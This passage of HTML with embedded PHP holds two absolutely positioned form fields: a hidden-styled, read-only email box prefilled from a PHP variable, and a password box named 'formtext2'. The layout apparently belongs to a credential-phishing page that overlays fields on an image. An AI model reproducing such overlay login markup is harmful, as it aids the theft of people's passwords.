...
<input name="email"  value="<?=$email?>" type="text" style="border: 0px solid #000000;position:absolute;width:270px;text-align:center; background:rgba(227,162,11,0.0);left:634px;top:380px;z-index:1" readonly>
<input name="formtext2"  placeholder=" Password"   required title="Enter your password" class="textbox" type="password" style="position:absolute;width:273px;left:631px;top:408px;z-index:2">
